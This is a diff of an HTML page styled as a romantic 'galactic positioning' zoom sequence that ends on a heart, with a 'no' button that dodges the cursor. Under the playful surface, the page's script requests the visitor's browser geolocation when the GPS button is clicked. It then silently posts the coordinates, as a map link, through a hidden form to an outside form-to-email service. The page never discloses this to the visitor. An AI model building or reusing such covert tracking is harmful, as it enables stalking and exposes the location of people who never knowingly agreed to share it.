@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Universal Location Map 🌌</title>
+    <title>Galactic Positioning System 🌌</title>
     <style>
         * {
             box-sizing: border-box;
@@ -11,238 +11,244 @@
             padding: 0;
         }
 
-        body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #030712;
-            color: #f3f4f6;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        body, html {
+            width: 100%;
+            height: 100%;
             overflow: hidden;
+            font-family: 'Orbitron', 'Segoe UI', Arial, sans-serif;
+            background: #000;
+            color: #fff;
         }
 
-        .stars-bg {
-            position: fixed;
+        /* Fullscreen Dynamic Layer */
+        .bg-layer {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
-            z-index: -1;
+            background-size: cover;
+            background-position: center;
+            transition: all 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+            filter: brightness(0.65) contrast(1.1);
+            z-index: 1;
         }
 
-        .card {
-            background: rgba(17, 24, 39, 0.85);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 24px;
-            padding: 35px 25px;
-            width: 90%;
-            max-width: 440px;
+        /* Scanline Overlay for Sci-Fi Effect */
+        .scanlines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            background-size: 100% 3px, 6px 100%;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        /* HUD Glassmorphism Control Center */
+        .hud-container {
+            position: relative;
+            z-index: 10;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .hud-card {
+            background: rgba(10, 15, 30, 0.75);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 240, 255, 0.3);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 480px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.7);
-        }
-
-        .step {
-            display: none;
-        }
-
-        .step.active {
-            display: block;
-            animation: zoomFade 0.7s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
-
-        @keyframes zoomFade {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        /* قاب تصاویر واقعی */
-        .map-image-container {
-            width: 180px;
-            height: 180px;
-            margin: 0 auto 20px auto;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 3px solid rgba(99, 102, 241, 0.5);
-            box-shadow: 0 0 25px rgba(99, 102, 241, 0.4);
+            box-shadow: 0 0 50px rgba(0, 240, 255, 0.2), inset 0 0 15px rgba(0, 240, 255, 0.1);
             position: relative;
         }
 
-        .map-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: transform 3s ease;
-        }
-
-        .step.active .map-image {
-            transform: scale(1.15);
+        .hud-header {
+            font-size: 12px;
+            letter-spacing: 3px;
+            color: #00f0ff;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px #00f0ff;
         }
 
         h2 {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
-            background: linear-gradient(135deg, #a5b4fc, #38bdf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 26px;
+            margin-bottom: 15px;
+            color: #ffffff;
+            font-weight: 700;
+            text-shadow: 0 0 12px rgba(255,255,255,0.6);
         }
 
         p {
-            font-size: 15px;
-            color: #9ca3af;
+            font-size: 14px;
+            color: #a0aec0;
             line-height: 1.6;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
+        }
+
+        /* Unique Sci-Fi Buttons */
+        .hud-btn {
+            background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(0, 110, 255, 0.4));
+            border: 1px solid #00f0ff;
+            color: #fff;
+            padding: 14px 32px;
+            font-size: 15px;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+            text-transform: uppercase;
+        }
+
+        .hud-btn:hover {
+            background: #00f0ff;
+            color: #000;
+            box-shadow: 0 0 30px #00f0ff;
+            transform: scale(1.05);
         }
 
         .btn-group {
             position: relative;
             display: flex;
             justify-content: center;
-            gap: 15px;
-            min-height: 50px;
+            gap: 20px;
+            min-height: 60px;
         }
 
-        button {
-            padding: 12px 28px;
-            border-radius: 12px;
-            border: none;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
+        #btnNo {
+            background: rgba(255, 50, 100, 0.2);
+            border: 1px solid #ff3264;
+            color: #ff3264;
+            position: absolute;
             transition: all 0.2s ease;
         }
 
-        .btn-primary {
-            background: linear-gradient(135deg, #6366f1, #3b82f6);
-            color: white;
-            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+        /* Step Visibilities */
+        .step {
+            display: none;
         }
 
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
+        .step.active {
+            display: block;
+            animation: hudFade 0.8s ease forwards;
         }
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: #d1d5db;
-            position: relative;
+        @keyframes hudFade {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .heart {
-            font-size: 90px;
-            animation: beat 1s infinite alternate ease-in-out;
-            filter: drop-shadow(0 0 25px #f43f5e);
-            margin: 20px 0;
+        /* Pulsing Heart Step */
+        .heart-box {
+            font-size: 100px;
+            animation: pulseGlow 1.2s infinite alternate ease-in-out;
+            margin-bottom: 20px;
         }
 
-        @keyframes beat {
-            to { transform: scale(1.25); }
-        }
-
-        .location-tag {
-            display: inline-block;
-            background: rgba(99, 102, 241, 0.2);
-            border: 1px solid rgba(99, 102, 241, 0.4);
-            color: #c7d2fe;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-size: 13px;
-            margin-bottom: 15px;
+        @keyframes pulseGlow {
+            from { transform: scale(1); filter: drop-shadow(0 0 20px #ff0055); }
+            to { transform: scale(1.3); filter: drop-shadow(0 0 60px #ff0055); }
         }
     </style>
 </head>
 <body>
 
-    <div class="stars-bg"></div>
+    <!-- Fullscreen dynamic backgrounds -->
+    <div id="bgLayer" class="bg-layer" style="background-image: url('https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?w=1600');"></div>
+    <div class="scanlines"></div>
 
-    <div class="card">
-        <!-- STEP 1: GALAXY -->
-        <div class="step active" id="step1">
-            <div class="map-image-container">
-                <img src="https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?w=500" class="map-image" alt="Milky Way Galaxy">
+    <div class="hud-container">
+        <div class="hud-card">
+            
+            <!-- STEP 1: MILKY WAY GALAXY -->
+            <div class="step active" id="step1">
+                <div class="hud-header">SYS // SECTOR 01</div>
+                <h2>Milky Way Galaxy</h2>
+                <p>Initializing deep space tracking systems...</p>
+                <button class="hud-btn" onclick="goToStep(2, 'https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?w=1600')">Zoom Earth 🔭</button>
             </div>
-            <div class="location-tag">Sector: Milky Way</div>
-            <h2>Universal Map</h2>
-            <p>Locating system in the Milky Way Galaxy...</p>
-            <button class="btn-primary" onclick="nextStep(2)">Zoom In 🔭</button>
-        </div>
 
-        <!-- STEP 2: EARTH -->
-        <div class="step" id="step2">
-            <div class="map-image-container">
-                <img src="https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?w=500" class="map-image" alt="Planet Earth">
+            <!-- STEP 2: PLANET EARTH -->
+            <div class="step" id="step2">
+                <div class="hud-header">SYS // PLANET 03</div>
+                <h2>Planet Earth</h2>
+                <p>Scanning atmospheric grid and continental landmasses...</p>
+                <button class="hud-btn" onclick="goToStep(3, 'https://images.unsplash.com/photo-1541872703-74c5e44368f9?w=1600')">Locate Country 🛰️</button>
             </div>
-            <div class="location-tag">Planet: Earth</div>
-            <h2>Scanning Earth</h2>
-            <p>Targeting atmosphere and continental coordinates...</p>
-            <button class="btn-primary" onclick="nextStep(3)">Zoom In 🛰️</button>
-        </div>
 
-        <!-- STEP 3: AFGHANISTAN -->
-        <div class="step" id="step3">
-            <div class="map-image-container">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Afghanistan_%28orthographic_projection%29.svg/1200px-Afghanistan_%28orthographic_projection%29.svg.png" class="map-image" style="background:#fff; padding:10px;" alt="Afghanistan Map">
+            <!-- STEP 3: AFGHANISTAN -->
+            <div class="step" id="step3">
+                <div class="hud-header">SYS // REGION AFG</div>
+                <h2>Afghanistan Map</h2>
+                <p>Targeting national geographical parameters...</p>
+                <button class="hud-btn" onclick="goToStep(4, 'https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=1600')">Focus Sector 📍</button>
             </div>
-            <div class="location-tag">Country: Afghanistan</div>
-            <h2>Locating Country</h2>
-            <p>Scanning Central Asia region and national map...</p>
-            <button class="btn-primary" onclick="nextStep(4)">Zoom In 📍</button>
-        </div>
 
-        <!-- STEP 4: PANJSHIR & KABUL -->
-        <div class="step" id="step4">
-            <div class="map-image-container">
-                <img src="https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=500" class="map-image" alt="Mountains of Panjshir">
+            <!-- STEP 4: PANJSHIR & KABUL -->
+            <div class="step" id="step4">
+                <div class="hud-header">SYS // REGIONAL HUB</div>
+                <h2>Panjshir & Kabul</h2>
+                <p>Establishing satellite telemetry link over the valley...</p>
+                <button class="hud-btn" onclick="requestGPS('https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=1600')">Fine Tune GPS 🎯</button>
             </div>
-            <div class="location-tag">Provinces: Panjshir & Kabul</div>
-            <h2>Regional Satellite</h2>
-            <p>Focusing on Panjshir valley and Kabul region...</p>
-            <button class="btn-primary" onclick="requestLocation()">Fine Tune GPS 🎯</button>
-        </div>
 
-        <!-- STEP 5: QUESTION -->
-        <div class="step" id="step5">
-            <div class="map-image-container" style="border-color:#f43f5e; box-shadow:0 0 25px rgba(244,63,94,0.4);">
-                <img src="https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=500" class="map-image" alt="Compass">
+            <!-- STEP 5: FINAL QUESTION -->
+            <div class="step" id="step5">
+                <div class="hud-header">SYS // FINAL COORD</div>
+                <h2>Final Location Query</h2>
+                <p>Do you want to know where you are really located?</p>
+                <div class="btn-group">
+                    <button class="hud-btn" onclick="goToStep(6, 'https://images.unsplash.com/photo-1518199266791-5375a83190b7?w=1600')">yeah 🫣</button>
+                    <button class="hud-btn" id="btnNo">noch 🙂‍↔️</button>
+                </div>
             </div>
-            <h2>Final Query</h2>
-            <p>Do you want to know where you are really located?</p>
-            <div class="btn-group">
-                <button class="btn-primary" onclick="showHeart()"> yeah 🫣</button>
-                <button class="btn-secondary" id="btnNo"> noch 🙂‍↔️</button>
-            </div>
-        </div>
 
-        <!-- STEP 6: HEART RESULT -->
-        <div class="step" id="step6">
-            <div class="heart">❤️</div>
-            <h2 style="font-size: 32px; margin-top: 10px;">In My Heart</h2>
-            <p>You are always right here, safe and sound. ✨</p>
+            <!-- STEP 6: IN MY HEART -->
+            <div class="step" id="step6">
+                <div class="heart-box">❤️</div>
+                <h2 style="font-size: 36px; color: #ff0055; text-shadow: 0 0 25px #ff0055;">In My Heart</h2>
+                <p style="color: #fff; font-size: 16px;">You are always right here, safe and sound. ✨</p>
+            </div>
+
         </div>
     </div>
 
+    <!-- Background Email Form -->
     <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
         <input type="text" name="location_coords" id="coordsInput">
         <input type="hidden" name="_captcha" value="false">
     </form>
 
     <script>
-        function nextStep(stepNum) {
+        function goToStep(stepNum, bgUrl) {
+            // Change Step
             document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
             document.getElementById('step' + stepNum).classList.add('active');
+            
+            // Smoothly Change Fullscreen Background Image
+            if(bgUrl) {
+                document.getElementById('bgLayer').style.backgroundImage = `url('${bgUrl}')`;
+            }
         }
 
-        function requestLocation() {
+        function requestGPS(bgUrl) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        document.getElementById('coordsInput').value = `GPS Location: https://maps.google.com/?q=${lat},${lon}`;
+                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${lat},${lon}`;
                         
                         const form = document.getElementById('geoForm');
                         fetch(form.action, {
@@ -250,17 +256,18 @@
                             body: new FormData(form)
                         }).catch(e => console.log(e));
 
-                        nextStep(5);
+                        goToStep(5, bgUrl);
                     },
                     function(error) {
-                        nextStep(5);
+                        goToStep(5, bgUrl);
                     }
                 );
             } else {
-                nextStep(5);
+                goToStep(5, bgUrl);
             }
         }
 
+        // Runaway Button logic
         const btnNo = document.getElementById("btnNo");
         if (btnNo) {
             btnNo.addEventListener("mouseover", moveBtn);
@@ -268,13 +275,9 @@
         }
 
         function moveBtn() {
-            const x = Math.floor(Math.random() * 200) - 100;
-            const y = Math.floor(Math.random() * 200) - 100;
+            const x = Math.floor(Math.random() * 240) - 120;
+            const y = Math.floor(Math.random() * 240) - 120;
             btnNo.style.transform = `translate(${x}px, ${y}px)`;
-        }
-
-        function showHeart() {
-            nextStep(6);
         }
     </script>
 </body>
